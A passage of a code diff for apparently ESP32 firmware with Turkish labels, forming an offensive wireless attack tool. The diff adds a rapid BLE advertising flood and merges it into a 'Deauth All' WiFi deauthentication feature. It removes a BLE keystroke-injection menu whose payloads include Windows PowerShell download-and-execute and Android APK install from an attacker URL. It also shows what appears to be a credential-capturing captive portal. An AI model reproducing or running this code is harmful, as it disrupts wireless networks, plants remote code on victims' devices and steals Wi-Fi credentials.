-    vTaskDelete(NULL);
-    return;
-  }
-
-  Serial.println("[BLEKeyboard] Bağlantı kuruldu! 2 sn sonra payload gönderiliyor...");
-  vTaskDelay(pdMS_TO_TICKS(2000));
-
-  switch (ble_keystroke_payload) {
-    case 0: payloadUrlBar(ble_keystroke_url);  break;
-    case 1: payloadAndroidYT();                break;
-    case 2: payloadAndroidAPK(ble_keystroke_url); break;
-    case 3: payloadWinRun(ble_keystroke_url);  break;
-    case 4: payloadWinPwsh(ble_apk_url);       break;
-    case 5: payloadIOSSafari(ble_keystroke_url); break;
-  }
-
-  Serial.println("[BLEKeyboard] ✓ Payload gönderildi.");
-  ble_keystroke_active = false;
-  pAdv->stop();
-  vTaskDelete(NULL);
+  pAdv->setAdvData(advData);
+  pAdv->setScanRspData(scanData);
+  pAdv->setMinInterval(0x20); // 20ms — minimum, maksimum flood hızı
+  pAdv->setMaxInterval(0x20);
+  pAdv->startAdv();
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
@@ -1402,13 +1179,11 @@ void sendStartPage(WiFiClient &client) {
   client.print("<form method='POST' action='/rescan'><button type='submit' class='btn-blue' style='margin-top:10px;'>&#8635; Ağları Yenile</button></form>");
 
   if (deauth_all_active) {
-    client.print("<div style='background:#fdeced;border:1px solid #e74c3c;border-radius:8px;padding:10px 14px;margin-top:12px;text-align:center;font-size:0.9rem;font-weight:600;color:#c0392b;'>&#9889; Deauth All AKTIF — Taranan tüm ağlar deauth edilmekte</div>");
+    client.print("<div style='background:#fdeced;border:1px solid #e74c3c;border-radius:8px;padding:10px 14px;margin-top:12px;text-align:center;font-size:0.9rem;font-weight:600;color:#c0392b;'>&#9889; Deauth All AKTIF — WiFi deauth + BLE flood sırayla çalışıyor</div>");
     client.print("<form method='POST' action='/deauth_all'><button type='submit' style='margin-top:8px;background:#c0392b;box-shadow:none;'>&#9724; Deauth All Durdur</button></form>");
   } else {
-    client.print("<form method='POST' action='/deauth_all'><button type='submit' style='margin-top:12px;background:#c0392b;box-shadow:none;'>&#9889; Deauth All — Tüm Ağları Deauth Et</button></form>");
+    client.print("<form method='POST' action='/deauth_all'><button type='submit' style='margin-top:12px;background:#c0392b;box-shadow:none;'>&#9889; Deauth All — WiFi + BLE Tüm Cihazları Deauth Et</button></form>");
   }
-
-  client.print("<a href='/ble'><button type='button' style='margin-top:10px;background:#8e44ad;box-shadow:none;width:100%;padding:15px;border:none;border-radius:8px;color:#fff;font-size:1.1rem;font-weight:bold;cursor:pointer;'>&#128268; Bluetooth Tarayıcı</button></a>");
 
   if (strlen(saved_ssid) > 0) {
     client.print("<div style='background:#fff;border:1px solid #bdc3c7;border-radius:8px;padding:12px;margin-top:20px;'>");
@@ -1494,126 +1269,6 @@ void sendPortalPage(WiFiClient &client, bool show_result) {
   client.print("<div class='footer'>Güvenli Bağlantı Yöneticisi &copy;</div></div></body></html>");
 }
 
-void sendBLEPage(WiFiClient &client) {
-  if (!client.connected()) return;
-  client.print("HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\nCache-Control: no-store, no-cache, must-revalidate\r\n\r\n");
-  client.print("<!DOCTYPE html><html lang='tr'><head><meta charset='UTF-8'>");
-  client.print("<meta name='viewport' content='width=device-width,initial-scale=1'><title>Bluetooth Tarayıcı</title>");
-  sendChunkedCSS(client);
-  if (!client.connected()) return;
-  client.print("</head><body>");
-  sendOfflineScript(client);
-
-  client.print("<div class='card'>");
-  client.print("<div style='text-align:center;margin-bottom:16px;'>");
-  client.print("<svg width='54' height='54' viewBox='0 0 24 24' fill='none' stroke='#8e44ad' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'><polyline points='6.5 6.5 17.5 17.5 12 23 12 1 17.5 6.5 6.5 17.5'></polyline></svg></div>");
-  client.print("<h1 style='color:#8e44ad;'>Bluetooth Tarayıcı</h1>");
-  client.print("<p class='sub'>Çevredeki Bluetooth ve BLE cihazları tarar ve listeler.</p>");
-
-  if (ble_scan_status == BLE_RUNNING) {
-    client.print("<div class='status-box wait'><span class='spinner'></span>BLE tarama devam ediyor (5 sn), lütfen bekleyiniz...</div>");
-  }
-
-  if (ble_mutex) xSemaphoreTake(ble_mutex, portMAX_DELAY);
-
-  client.print("<h2 style='margin-bottom:10px;'>&#128268; Bulunan Cihazlar (");
-  client.print(ble_devices.size());
-  client.print(")</h2><ul class='net-list'>");
-
-  if (ble_devices.size() > 0) {
-    for (auto &dev : ble_devices) {
-      client.print("<li class='net-item' style='cursor:default;'>");
-      client.print("<div class='net-info'><div class='net-name'>");
-      if (dev.name.length() > 0) {
-        String safe = dev.name;
-        safe.replace("&", "&amp;"); safe.replace("<", "&lt;");
-        client.print(safe);
-      } else {
-        client.print("<span style='color:#aaa;font-style:italic;'>İsimsiz Cihaz</span>");
-      }
-      client.print("</div><div class='net-meta'>MAC: "); client.print(dev.address);
-      client.print(" &nbsp;|&nbsp; RSSI: "); client.print(dev.rssi); client.print(" dBm</div></div>");
-      String bar;
-      if      (dev.rssi > -50) bar = "&#9608;&#9608;&#9608;&#9608;";
-      else if (dev.rssi > -65) bar = "&#9608;&#9608;&#9608;&#9617;";
-      else if (dev.rssi > -75) bar = "&#9608;&#9608;&#9617;&#9617;";
-      else                     bar = "&#9608;&#9617;&#9617;&#9617;";
-      client.print("<div style='font-size:.85rem;color:#8e44ad;white-space:nowrap;margin-left:8px;'>"); client.print(bar); client.print("</div>");
-      client.print("</li>");
-    }
-  } else if (ble_scan_status != BLE_RUNNING) {
-    client.print("<li style='padding:16px;text-align:center;color:#7f8c8d;'>&#10060; Cihaz bulunamadı. Tarama başlatınız.</li>");
-  }
-
-  if (ble_mutex) xSemaphoreGive(ble_mutex);
-  client.print("</ul>");
-
-  if (ble_scan_status != BLE_RUNNING) {
-    client.print("<form method='POST' action='/ble_scan'><button type='submit' style='background:#8e44ad;box-shadow:none;'>&#128268; BLE Tara</button></form>");
-  } else {
-    client.print("<button disabled style='background:#8e44ad;opacity:0.5;box-shadow:none;cursor:not-allowed;'>&#128268; Tarama Devam Ediyor...</button>");
-    client.print("<script>setTimeout(function(){window.location.reload();},6500);</script>");
-  }
-
-  // ─── BLE SPAM ───
-  client.print("<div style='margin-top:16px;border-top:1px solid #eee;padding-top:14px;'>");
-  if (ble_spam_active) {
-    client.print("<div style='background:#fef9e7;border:1px solid #f39c12;border-radius:8px;padding:10px;margin-bottom:8px;text-align:center;font-size:0.9rem;font-weight:600;color:#d68910;'>&#128248; Spam Devices AKTIF — iPhone/AirPods/Galaxy yayınlanıyor</div>");
-    client.print("<form method='POST' action='/ble_spam'><button type='submit' style='background:#d35400;box-shadow:none;'>&#9724; Spam Devices Durdur</button></form>");
-  } else {
-    client.print("<form method='POST' action='/ble_spam'><button type='submit' style='background:#e67e22;box-shadow:none;'>&#128248; Spam Devices — iPhone/AirPods/Android Yayınla</button></form>");
-  }
-
-  // ─── BLE FLOOD (DEAUTH) ───
-  client.print("<div style='margin-top:8px;'>");
-  if (ble_flood_active) {
-    client.print("<div style='background:#fdeced;border:1px solid #e74c3c;border-radius:8px;padding:10px;margin-bottom:8px;text-align:center;font-size:0.9rem;font-weight:600;color:#c0392b;'>&#9889; BLE Flood AKTIF — BLE tarayıcılar bunaltılıyor</div>");
-    client.print("<form method='POST' action='/ble_flood'><button type='submit' style='background:#c0392b;box-shadow:none;'>&#9724; BLE Flood Durdur</button></form>");
-  } else {
-    client.print("<form method='POST' action='/ble_flood'><button type='submit' style='background:#c0392b;box-shadow:none;'>&#9889; BLE Flood — Tüm Cihazlara BLE Saldırı</button></form>");
-  }
-  client.print("</div></div>");
-
-  // ─── BLE KEYSTROKE INJECTION ───
-  client.print("<div style='margin-top:8px;border-top:1px solid #eee;padding-top:14px;'>");
-  client.print("<h3 style='font-size:1rem;color:#1a252f;margin-bottom:10px;'>&#9000; Keystroke Injection (BLE HID Klavye)</h3>");
-
-  if (ble_keystroke_active) {
-    if (ble_hid_connected) {
-      client.print("<div class='status-box ok'>&#128241; Cihaz bağlı — Payload gönderiliyor...</div>");
-    } else {
-      client.print("<div class='status-box wait'><span class='spinner'></span>BT Keyboard yayınlanıyor, eşleşme bekleniyor...</div>");
-    }
-    client.print("<form method='POST' action='/ble_keystroke'><button type='submit' style='background:#7f8c8d;box-shadow:none;'>&#9724; Durdur</button></form>");
-  } else {
-    client.print("<form method='POST' action='/ble_keystroke_set'>");
-
-    client.print("<label style='font-size:.85rem;font-weight:600;color:#34495e;display:block;margin-bottom:6px;'>Hedef / Payload</label>");
-    client.print("<select name='payload' style='width:100%;padding:10px;border-radius:8px;border:1px solid #bdc3c7;margin-bottom:10px;font-size:.95rem;background:#fff;'>");
-    client.print("<option value='0'>&#127760; Tarayıcı — Ctrl+L + URL + Enter (Evrensel)</option>");
-    client.print("<option value='1'>&#129302; Android — YouTube Aç</option>");
-    client.print("<option value='2'>&#129302; Android — APK İndir &amp; Kur</option>");
-    client.print("<option value='3'>&#128187; Windows — Win+R + URL</option>");
-    client.print("<option value='4'>&#128187; Windows — PowerShell Dosya İndir &amp; Çalıştır</option>");
-    client.print("<option value='5'>&#127822; iOS/Mac — Spotlight + Safari URL</option>");
-    client.print("</select>");
-
-    client.print("<label style='font-size:.85rem;font-weight:600;color:#34495e;display:block;margin-bottom:6px;'>URL / Hedef Adres</label>");
-    client.print("<input type='text' name='url' value='"); client.print(ble_keystroke_url);
-    client.print("' style='width:100%;padding:10px;border-radius:8px;border:1px solid #bdc3c7;margin-bottom:6px;font-size:.95rem;'>");
-
-    client.print("<label style='font-size:.85rem;font-weight:600;color:#34495e;display:block;margin-bottom:6px;'>APK / EXE URL (Win PowerShell için)</label>");
-    client.print("<input type='text' name='apk_url' value='"); client.print(ble_apk_url);
-    client.print("' style='width:100%;padding:10px;border-radius:8px;border:1px solid #bdc3c7;margin-bottom:10px;font-size:.95rem;'>");
-
-    client.print("<button type='submit' style='background:#2c3e50;box-shadow:none;'>&#9000; BLE Klavye Başlat &amp; Payload Gönder</button>");
-    client.print("</form>");
-  }
-  client.print("</div>");
-
-  client.print("<a href='/'><button type='button' class='btn-blue' style='margin-top:12px;box-shadow:none;'>&#8592; Ana Sayfa</button></a>");
-  client.print("<div class='footer'>Bluetooth Tarayıcı &copy;</div></div></body></html>");
-}
 
 void handleClient(WiFiClient &client) {
   static char hbuf[896];
@@ -1749,89 +1404,6 @@ void handleClient(WiFiClient &client) {
       return;
     }
 
-    if (path == "/ble") {
-      sendBLEPage(client);
-      client.flush();
-      return;
-    }
-
-    if (request.startsWith("POST") && path == "/ble_scan") {
-      if (ble_scan_status != BLE_RUNNING) {
-        ble_scan_status = BLE_RUNNING;
-        xTaskCreate(bleScanTask, "ble_scan", 8192, NULL, tskIDLE_PRIORITY + 2, NULL);
-        Serial.println("[BLE] Kullanıcı tarama başlattı.");
-      }
-      sendBLEPage(client);
-      client.flush();
-      return;
-    }
-
-    if (request.startsWith("POST") && path == "/ble_spam") {
-      if (ble_spam_active) {
-        ble_spam_active = false;
-        delay(100);
-        Serial.println("[BLESpam] Kullanıcı durdurdu.");
-      } else {
-        ble_flood_active = false;
-        delay(100);
-        ble_spam_active = true;
-        xTaskCreate(bleSpamTask, "ble_spam", 4096, NULL, tskIDLE_PRIORITY + 1, NULL);
-        Serial.println("[BLESpam] Kullanıcı başlattı.");
-      }
-      sendBLEPage(client);
-      client.flush();
-      return;
-    }
-
-    if (request.startsWith("POST") && path == "/ble_flood") {
-      if (ble_flood_active) {
-        ble_flood_active = false;
-        delay(100);
-        Serial.println("[BLEFlood] Kullanıcı durdurdu.");
-      } else {
-        ble_spam_active = false;
-        delay(100);
-        ble_flood_active = true;
-        xTaskCreate(bleFloodTask, "ble_flood", 4096, NULL, tskIDLE_PRIORITY + 1, NULL);
-        Serial.println("[BLEFlood] Kullanıcı başlattı.");
-      }
-      sendBLEPage(client);
-      client.flush();
-      return;
-    }
-
-    if (request.startsWith("POST") && path == "/ble_keystroke_set") {
-      // URL ve payload ayarlarını güncelle, ardından klavyeyi başlat
-      String pl  = parsePostParam(body, "payload");
-      String url = parsePostParam(body, "url");
-      String apk = parsePostParam(body, "apk_url");
-      if (pl.length())  ble_keystroke_payload = (uint8_t)pl.toInt();
-      if (url.length()) { url.toCharArray(ble_keystroke_url, sizeof(ble_keystroke_url)); }
-      if (apk.length()) { apk.toCharArray(ble_apk_url, sizeof(ble_apk_url)); }
-      if (!ble_keystroke_active) {
-        ble_spam_active  = false;
-        ble_flood_active = false;
-        delay(100);
-        ble_keystroke_active = true;
-        xTaskCreate(bleKeystrokeTask, "ble_kb", 8192, NULL, tskIDLE_PRIORITY + 1, NULL);
-        Serial.print("[BLEKeyboard] Başlatıldı. Payload: "); Serial.println(ble_keystroke_payload);
-      }
-      sendBLEPage(client);
-      client.flush();
-      return;
-    }
-
-    if (request.startsWith("POST") && path == "/ble_keystroke") {
-      // Sadece durdur
-      ble_keystroke_active = false;
-      ble_hid_connected    = false;
-      delay(100);
-      Serial.println("[BLEKeyboard] Kullanıcı durdurdu.");
-      sendBLEPage(client);
-      client.flush();
-      return;
-    }
-
     if (request.startsWith("POST") && path == "/deauth_all") {
       if (deauth_all_active) {
         deauth_all_active = false;
@@ -1916,9 +1488,8 @@ void setup() {
   Serial.println("[Boot] Bağlantı Hızı ve Yönlendirme İyileştirildi!");
 
   networks_mutex = xSemaphoreCreateMutex();
-  ble_mutex      = xSemaphoreCreateMutex();
 
-  BLEDevice::init("");
+  // BLE her görev içinde kendi init/begin/end döngüsünü yönetiyor
 
   FlashMemory.begin(FLASH_OFFSET, FLASH_BUF_SIZE);
   loadCredentials();
